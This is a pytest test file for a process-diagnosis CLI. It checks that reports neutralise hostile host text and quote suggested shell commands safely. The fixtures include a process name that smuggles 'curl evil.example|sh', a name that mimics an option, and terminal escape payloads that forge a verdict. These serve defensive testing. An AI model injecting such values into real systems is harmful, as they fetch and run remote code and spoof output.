"""What procdiag prints and writes is safe and truthful.

Host-supplied text (process names, mount points, service names, kernel lines)
must never forge or hide the verdict or change a suggested command, the
commands must survive a shell, ``snapshot`` / ``quick`` must not crash on odd
names, and the summary must not say 正常 / 問題なし when it is not.
"""

from __future__ import annotations

import json
import re
import shlex
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from types import SimpleNamespace

import pytest
from click.testing import CliRunner
from synth import (
    add_disk_series,
    add_proc_series,
    add_spike_events,
    add_sys_baseline,
    add_zombie_series,
    make_db,
)

from procdiag import snapshot as snap
from procdiag.cli import cli
from procdiag.config import ProcdiagConfig
from procdiag.core import Diagnosis, Finding, Severity
from procdiag.core.result import Confidence
from procdiag.diagnosis import Engine
from procdiag.report import (
    ChartData,
    render_html,
    render_json,
    render_terminal,
)
from procdiag.storage import Storage

_MB = 1024 * 1024
_GB = 1024**3
_HOUR = 3600.0

PAYLOAD = (
    "myapp\x1b[2J\x1b[Habc\x1b]0;pwned\x07\n診断: 問題は見つかりませんでした。\x1b[8m"
)
FORGED = "診断: 問題は見つかりませんでした。"
EVIL_NAME = "myapp;curl evil.example|sh"
SPACED_MOUNT = "/media/operator/USB DISK"


def _invoke(*args: object):
    return CliRunner().invoke(cli, [str(a) for a in args])


def _leak_db(tmp_path: Path, name: str, *, mount: str | None = None) -> Path:
    """A DB with a leaking, thread-leaking and fd-leaking process called *name*."""
    store = make_db(tmp_path, hours=26)
    now = time.time()
    add_sys_baseline(store, hours=26, start_ts=now - 26 * _HOUR)
    add_proc_series(
        store,
        name,
        rss_start=200 * _MB,
        rss_slope_per_h=60 * _MB,
        hours=8,
        start_ts=now - 8 * _HOUR,
        threads_slope=30,
        fds_slope=40,
    )
    if mount:
        add_disk_series(
            store,
            mount,
            total=100 * _GB,
            used_start=80 * _GB,
            daily_growth=8 * _GB,
            days=1.0,
            start_ts=now - 24 * _HOUR,
        )
    path = store.path
    store.close()
    return path


def _diagnose(db: Path, **kwargs) -> Diagnosis:
    with Storage(db, read_only=True) as store:
        return Engine(ProcdiagConfig()).run(store, **kwargs)


def _written(tmp_path: Path, *args: object) -> bytes:
    out = tmp_path / "report.out"
    _invoke("check", *args, "-o", out)
    return out.read_bytes()


# ---------------------------------------------------------------------------
# B38: control characters in host text
# ---------------------------------------------------------------------------


class TestControlCharacters:
    @pytest.fixture
    def db(self, tmp_path):
        return _leak_db(tmp_path, PAYLOAD)

    def test_text_file_has_no_control_bytes_and_no_forged_verdict(self, db, tmp_path):
        data = _written(tmp_path, "--db", db, "--no-color", "--only", "MEM-LEAK-01")
        text = data.decode("utf-8")
        assert "\x1b" not in text and "\x07" not in text
        assert not any(line.startswith(FORGED) for line in text.splitlines())
        assert "\\x1b[2J" in text
        assert "\\n" in text

    def test_colour_output_carries_only_our_own_colour_codes(self, db):
        diag = _diagnose(db, only=["MEM-LEAK-01"])
        out = render_terminal(diag, color=True)
        assert re.findall(r"\x1b(?!\[(?:0|1|3[1236])m)", out) == []
        assert "\x07" not in out
        assert not any(line.startswith(FORGED) for line in out.splitlines())
        assert "\033[" in out

    def test_html_has_no_control_bytes(self, db, tmp_path):
        data = _written(tmp_path, "--db", db, "--format", "html")
        text = data.decode("utf-8")
        assert "\x1b" not in text and "\x07" not in text

    def test_json_escapes_terminal_control_code_points(self):
        finding = Finding(
            rule_id="MEM-LEAK-01",
            severity=Severity.WARNING,
            subject="a\x9b31mb\x7f\u2028c\u202ed",
            summary="s",
            evidence={},
            detected_at=(1.0, 2.0),
            confidence=Confidence.HIGH,
        )
        diag = Diagnosis(findings=[finding], healthy=False)
        raw = render_json(diag)
        for ch in "\x9b\x7f\u2028\u202e":
            assert ch not in raw
        assert json.loads(raw)["findings"][0]["subject"] == finding.subject

    def test_compare_text_has_no_control_bytes(self, tmp_path):
        directory = tmp_path / "cmp"
        directory.mkdir()
        store = make_db(directory, hours=48)
        now = time.time()
        at = now - 24 * _HOUR
        add_sys_baseline(store, hours=48, start_ts=now - 48 * _HOUR)
        for rss, slope, t0 in ((200, 38, now - 48 * _HOUR), (300, 0.2, at)):
            add_proc_series(
                store,
                PAYLOAD,
                rss_start=rss * _MB,
                rss_slope_per_h=slope * _MB,
                hours=24,
                start_ts=t0,
            )
        db = store.path
        store.close()
        out = tmp_path / "cmp.out"
        iso = datetime.fromtimestamp(at).strftime("%Y-%m-%dT%H:%M:%S")
        _invoke(
            "compare",
            "--db",
            db,
            "--at",
            iso,
            "--no-color",
            "--verbose",
            "--output",
            out,
        )
        text = out.read_text(encoding="utf-8")
        assert "MEM-LEAK-01" in text
        assert "\x1b" not in text and "\x07" not in text
        assert not any(line.startswith(FORGED) for line in text.splitlines())

    def test_status_events_are_neutralised(self, tmp_path):
        store = make_db(tmp_path, hours=1)
        add_sys_baseline(store, hours=1)
        store.record_event("gap", PAYLOAD)
        db = store.path
        store.close()
        result = _invoke("status", "--db", db)
        assert "\x1b" not in result.output and "\x07" not in result.output
        assert not any(
            line.startswith(FORGED.rstrip("。")) for line in result.output.splitlines()
        )

    @pytest.mark.parametrize("color", [False, True])
    def test_snapshot_text_neutralises_host_text(self, monkeypatch, color):
        procs = [
            {
                "pid": 7,
                "name": PAYLOAD,
                "status": "running",
                "cpu": 99.0,
                "rss": 10 * _MB,
            }
        ]
        monkeypatch.setattr(snap, "_sample_processes", lambda sec: ([99.0], procs))
        items = snap.run_snapshot(ProcdiagConfig(), sample_sec=0)
        text = snap.render_text(items, hostname="h", color=color, ascii_only=False)
        assert "\\x1b[2J" in text
        assert re.findall(r"\x1b(?!\[(?:0|1|3[1236])m)", text) == []
        assert "\x07" not in text
        assert not any(line.startswith(FORGED) for line in text.splitlines())


# ---------------------------------------------------------------------------
# B39: shell quoting in suggested commands
# ---------------------------------------------------------------------------


def _commands(diag: Diagnosis) -> list[str]:
    cmds = []
    for f in diag.findings:
        cmds += re.findall(r"`([^`]*)`", f.proposal)
    return cmds


@pytest.fixture(scope="module")
def evil(tmp_path_factory):
    db = _leak_db(tmp_path_factory.mktemp("evil"), EVIL_NAME, mount=SPACED_MOUNT)
    return _diagnose(db)


class TestQuotedCommands:
    def test_hostile_name_is_one_argument_of_each_command(self, evil):
        pgreps = [c for c in _commands(evil) if c.startswith("pgrep")]
        assert pgreps
        for cmd in pgreps:
            assert shlex.split(cmd)[-1] == EVIL_NAME

    def test_hostile_name_is_not_offered_to_systemctl(self, evil):
        for f in evil.findings:
            assert "systemctl restart" not in f.proposal

    def test_mount_point_with_a_space_is_one_argument(self, evil):
        du = [c for c in _commands(evil) if c.startswith("du -sh")]
        assert du
        assert shlex.split(du[0])[-1] == SPACED_MOUNT + "/*"

    def test_plausible_unit_name_keeps_the_restart_advice(self, tmp_path):
        diag = _diagnose(_leak_db(tmp_path, "myapp-worker"))
        restarts = [
            c for c in _commands(diag) if c.startswith("sudo systemctl restart")
        ]
        assert restarts
        assert all(
            shlex.split(c) == ["sudo", "systemctl", "restart", "myapp-worker"]
            for c in restarts
        )

    def test_name_that_looks_like_an_option_cannot_become_one(self, tmp_path):
        diag = _diagnose(_leak_db(tmp_path, "-rf"))
        pgreps = [c for c in _commands(diag) if c.startswith("pgrep")]
        assert pgreps
        for cmd in pgreps:
            argv = shlex.split(cmd)
            assert argv[-2:] == ["--", "-rf"]

    def test_html_report_carries_the_quoted_command_too(self, tmp_path):
        db = _leak_db(tmp_path, EVIL_NAME)
        text = _written(tmp_path, "--db", db, "--format", "html").decode()
        assert "systemctl restart myapp;curl" not in text
        assert "pgrep -a myapp;curl" not in text


# ---------------------------------------------------------------------------
# B40 / B78: what the verdict says
# ---------------------------------------------------------------------------


class TestHealthyVerdict:
    def test_empty_db_is_not_healthy(self, tmp_path):
        db = tmp_path / "empty.db"
        Storage(db).close()
        result = _invoke("check", "--db", db, "--format", "json")
        data = json.loads(result.output)
        assert result.exit_code == 3
        assert data["no_data"] is True
        assert data["healthy"] is False
        assert _diagnose(db).healthy is False

    def test_nothing_evaluated_is_not_healthy_nor_reported_as_such(self, tmp_path):
        store = make_db(tmp_path, hours=1)
        add_sys_baseline(store, hours=1, start_ts=time.time() - _HOUR)
        db = store.path
        store.close()
        only = ["--only", "MEM-LEAK-01,MEM-PRESSURE-01"]
        data = json.loads(
            _invoke("check", "--db", db, "--format", "json", *only).output
        )
        assert data["evaluated_rules"] == []
        assert data["healthy"] is False
        text = _invoke("check", "--db", db, "--no-color", *only).output
        html = _invoke("check", "--db", db, "--format", "html", *only).output
        assert "問題は見つかりませんでした" not in text
        assert "問題は見つかりませんでした" not in html
        assert "評価できたルールがありません" in text

    def test_clean_evaluated_host_is_healthy(self, tmp_path):
        store = make_db(tmp_path, hours=8)
        add_sys_baseline(store, hours=8, start_ts=time.time() - 8 * _HOUR)
        db = store.path
        store.close()
        only = ["--only", "CPU-SATURATION-01"]
        data = json.loads(
            _invoke("check", "--db", db, "--format", "json", *only).output
        )
        assert data["evaluated_rules"] == ["CPU-SATURATION-01"]
        assert data["healthy"] is True
        text = _invoke("check", "--db", db, "--no-color", *only).output
        assert "診断: 問題は見つかりませんでした。" in text

    @pytest.fixture
    def info_only(self, tmp_path):
        store = make_db(tmp_path, hours=8)
        now = time.time()
        add_sys_baseline(store, hours=8, start_ts=now - 8 * _HOUR)
        add_zombie_series(
            store, hours=8, zombie_slope_per_h=6, start_ts=now - 8 * _HOUR
        )
        db = store.path
        store.close()
        return db, ["--only", "ZOMBIE-01"]

    def test_info_only_text_says_so_and_keeps_the_proposal(self, info_only):
        db, only = info_only
        result = _invoke("check", "--db", db, "--no-color", *only)
        assert result.exit_code == 2
        assert "問題は見つかりませんでした" not in result.output
        assert "info の検出が 1 件" in result.output
        assert "[暫定対処]" in result.output

    def test_info_only_html_is_not_marked_normal(self, info_only):
        db, only = info_only
        html = _invoke("check", "--db", db, "--format", "html", *only).output
        assert 'class="badge-ok"' not in html
        assert '<span class="badge-info">' in html
        assert "問題は見つかりませんでした" not in html

    def test_info_only_json_stays_healthy_for_warning_and_critical(self, info_only):
        db, only = info_only
        data = json.loads(
            _invoke("check", "--db", db, "--format", "json", *only).output
        )
        assert data["healthy"] is True
        assert [f["severity"] for f in data["findings"]] == ["info"]


# ---------------------------------------------------------------------------
# B80 / B81: HTML charts and spike table
# ---------------------------------------------------------------------------


def _long_recording(tmp_path: Path, *, recent_spikes: int = 0) -> Path:
    """Seven days of rollups (raw only for the last 48 h) plus spikes."""
    store = make_db(tmp_path, hours=7 * 24)
    now = time.time() // 60 * 60
    old_start = now - 7 * 86400
    rows = [
        (
            old_start + i * 60,
            85.0,
            90.0,
            92.0,
            95.0,
            2 * _GB,
            2 * _GB,
            60.0,
            0.0,
            0.0,
            0,
        )
        for i in range(int((now - 48 * _HOUR - old_start) / 60))
    ]
    store.buffer("sys_rollup_1m", rows)
    store.flush(reason="synth")
    add_sys_baseline(store, hours=48, start_ts=now - 48 * _HOUR)
    add_spike_events(
        store, "cpu", [now - 6 * 86400, now - 5 * 86400, now - 4 * 86400, now - 3600]
    )
    if recent_spikes:
        add_spike_events(
            store, "cpu", [now - 47 * _HOUR + i * 60 for i in range(recent_spikes)]
        )
    path = store.path
    store.close()
    return path


class TestChartsFollowTheDiagnosedWindow:
    def test_charts_and_spike_table_stop_at_the_window(self, tmp_path):
        db = _long_recording(tmp_path)
        html = _written(tmp_path, "--db", db, "--format", "html").decode()
        window_start = time.time() - 49 * _HOUR
        times = re.findall(r"<tr class='spike-table'><td>([^<]*)</td>", html)
        assert len(times) == 1
        assert (
            datetime.strptime(times[0], "%Y-%m-%d %H:%M:%S").timestamp() > window_start
        )
        labels = re.findall(r'fill="#666">(\d\d)/(\d\d) \d\d:\d\d</text>', html)
        assert labels
        recent = {
            (t.month, t.day)
            for t in (datetime.fromtimestamp(time.time() - k * 86400) for k in range(3))
        }
        assert {(int(m), int(d)) for m, d in labels} <= recent

    def test_spike_table_is_capped_and_says_how_many_exist(self, tmp_path):
        db = _long_recording(tmp_path, recent_spikes=250)
        html = _written(tmp_path, "--db", db, "--format", "html").decode()
        rows = re.findall(r"<tr class='spike-table'>", html)
        assert len(rows) == 100
        assert "全 251 件" in html

    def test_axis_shows_the_date_only_when_the_window_spans_days(self):
        base = datetime(2026, 3, 4, 8, 0).timestamp()

        def labels(hours: float) -> list[str]:
            series = [(base + i * 60.0, 10.0) for i in range(int(hours * 60) + 1)]
            diag = Diagnosis(findings=[], healthy=True)
            html = render_html(diag, ChartData(cpu=series))
            svg = html[: html.index(">CPU使用率</text>")]
            return re.findall(
                r'fill="#666">((?:\d\d/\d\d )?\d\d:\d\d)</text>',
                svg[svg.rindex("<svg") :],
            )

        assert labels(3.0) == ["08:00", "11:00"]
        assert labels(30.0)[0].startswith("03/04 ")


def _short_recording(tmp_path: Path) -> Path:
    store = make_db(tmp_path, hours=0.05)
    now = time.time() // 60 * 60
    raw = [
        (
            now - 100 + i,
            50.0,
            60.0,
            2**31,
            2**32,
            0,
            0,
            0,
            1.0,
            5.0,
            0.0,
            0.0,
            0.0,
            0.0,
            0,
            0,
            0.5,
            2**25,
        )
        for i in range(100)
    ]
    store.buffer("sys_samples", raw)
    store.buffer(
        "sys_rollup_1m",
        [(now - 60, 50.0, 55.0, 58.0, 60.0, 2**31, 2**31, 5.0, 0.0, 0.0, 0)],
    )
    store.flush(reason="synth")
    path = store.path
    store.close()
    return path


class TestShortRecordingCharts:
    def test_two_minute_recording_draws_lines(self, tmp_path):
        html = _written(
            tmp_path, "--db", _short_recording(tmp_path), "--format", "html"
        ).decode()
        for title in ("CPU使用率", "CPU最大コア", "メモリ使用量 (bytes)", "PSI"):
            svg = html[: html.index(f">{title}</text>")]
            svg = svg[svg.rindex("<svg") :]
            lines = re.findall(r'<polyline points="([^"]*)"', svg)
            assert lines, title
            assert all(len(p.split()) >= 2 for p in lines), title

    def test_single_point_series_is_still_visible(self):
        diag = Diagnosis(findings=[], healthy=True)
        html = render_html(diag, ChartData(cpu=[(1_700_000_000.0, 40.0)]))
        svg = html[: html.index(">CPU使用率</text>")]
        assert "<circle" in svg[svg.rindex("<svg") :]


# ---------------------------------------------------------------------------
# B82: unmeasured quality values
# ---------------------------------------------------------------------------


class TestUnmeasuredQuality:
    @pytest.fixture
    def rollup_only_period(self, tmp_path):
        db = _long_recording(tmp_path)
        f = lambda t: datetime.fromtimestamp(t).strftime("%Y-%m-%d %H:%M")  # noqa: E731
        now = time.time()
        return db, ["--since", f(now - 5 * 86400), "--until", f(now - 3 * 86400)]

    def test_text_says_not_measured(self, rollup_only_period):
        db, period = rollup_only_period
        out = _invoke("check", "--db", db, "--no-color", *period).output
        self_load = [line for line in out.splitlines() if "自己負荷" in line]
        io = [line for line in out.splitlines() if "I/O 欠損率" in line]
        assert self_load and "未計測" in self_load[0] and "0.00%" not in self_load[0]
        assert io and "未計測" in io[0] and "0.0%" not in io[0]

    def test_html_says_not_measured(self, rollup_only_period):
        db, period = rollup_only_period
        html = _invoke("check", "--db", db, "--format", "html", *period).output
        assert "<dt>自己負荷 (平均)</dt><dd>未計測</dd>" in html
        assert "<dt>I/O 欠損率</dt><dd>未計測</dd>" in html

    def test_json_has_null(self, rollup_only_period):
        db, period = rollup_only_period
        q = json.loads(
            _invoke("check", "--db", db, "--format", "json", *period).output
        )["quality"]
        assert q["self_cpu_avg"] is None
        assert q["self_cpu_max"] is None
        assert q["missing_io_pct"] is None

    def test_measured_self_load_is_still_a_number(self, rollup_only_period):
        db, _ = rollup_only_period
        q = json.loads(_invoke("check", "--db", db, "--format", "json").output)[
            "quality"
        ]
        assert q["self_cpu_avg"] == pytest.approx(0.1)
        assert q["missing_io_pct"] is None


# ---------------------------------------------------------------------------
# B92: snapshot / quick with names that are not valid UTF-8
# ---------------------------------------------------------------------------

SJIS_NAME = "測定_tool".encode("shift_jis").decode("utf-8", "surrogateescape")
SJIS_ESCAPED = "".join(rf"\x{b:02x}" for b in "測定".encode("shift_jis"))
SJIS_MOUNT = "/mnt/" + "共有".encode("shift_jis").decode("utf-8", "surrogateescape")


def _fake_hosts(monkeypatch) -> None:
    class _Proc:
        def __init__(self, pid, name, cpu):
            self.info = {
                "pid": pid,
                "name": name,
                "status": "running",
                "memory_info": SimpleNamespace(rss=10 * _MB),
            }
            self._cpu = cpu

        def cpu_percent(self, interval=None):
            return self._cpu

    monkeypatch.setattr(
        snap.psutil,
        "process_iter",
        lambda attrs=None: [_Proc(1, SJIS_NAME, 90.0), _Proc(2, "ok", 1.0)],
    )
    part = SimpleNamespace(
        device="/dev/sdb1", mountpoint=SJIS_MOUNT, fstype="ext4", opts="rw"
    )
    monkeypatch.setattr(snap.psutil, "disk_partitions", lambda all=False: [part])
    monkeypatch.setattr(
        snap.psutil,
        "disk_usage",
        lambda mp: SimpleNamespace(percent=97.0, free=_GB, total=10 * _GB),
    )
    from procdiag.samplers import disk as disk_mod

    monkeypatch.setattr(disk_mod, "_inode_usage", lambda mp: (None, None))


class TestSnapshotNonUtf8:
    def test_items_hold_text_that_can_be_encoded(self, monkeypatch):
        _fake_hosts(monkeypatch)
        items = snap.run_snapshot(ProcdiagConfig(), sample_sec=0)
        text = snap.render_text(items, hostname="h", color=False, ascii_only=False)
        text.encode("utf-8")
        snap.render_json(items, hostname="h").encode("utf-8")
        assert SJIS_ESCAPED in text

    def test_json_report_keeps_a_non_utf8_name_as_valid_text(self):
        finding = Finding(
            rule_id="MEM-LEAK-01",
            severity=Severity.WARNING,
            subject=SJIS_NAME,
            summary="s",
            evidence={},
            detected_at=(1.0, 2.0),
            confidence=Confidence.HIGH,
        )
        raw = render_json(Diagnosis(findings=[finding], healthy=False))
        raw.encode("utf-8")
        assert json.loads(raw)["findings"][0]["subject"] == SJIS_ESCAPED + "_tool"

    @pytest.mark.parametrize("args", [[], ["--format", "json"]])
    def test_snapshot_command_does_not_crash(self, monkeypatch, tmp_path, args):
        monkeypatch.chdir(tmp_path)
        _fake_hosts(monkeypatch)
        result = _invoke("snapshot", *args)
        assert result.exit_code == 1, result.output
        assert not isinstance(result.exception, UnicodeError)
        assert (
            SJIS_ESCAPED.replace("\\", "\\\\") in result.output
            or SJIS_ESCAPED in result.output
        )

    def test_quick_reaches_the_report(self, tmp_path):
        code = (
            "import sys\n"
            "from types import SimpleNamespace\n"
            "from procdiag import snapshot as snap\n"
            "snap._sample_processes = lambda sec: ([5.0], [{'pid': 1, "
            f"'name': {SJIS_NAME!r}, 'status': 'running', 'cpu': 90.0, 'rss': 1}}])\n"
            "from procdiag.cli import cli\n"
            "cli(['quick', '--duration', '2s', '--out', 'q'])\n"
        )
        run = subprocess.run(
            [sys.executable, "-c", code],
            cwd=tmp_path,
            capture_output=True,
            timeout=120,
        )
        assert b"UnicodeEncodeError" not in run.stderr, run.stderr.decode()
        assert (tmp_path / "q" / "report.html").exists()
        assert "[3/3]".encode() in run.stdout
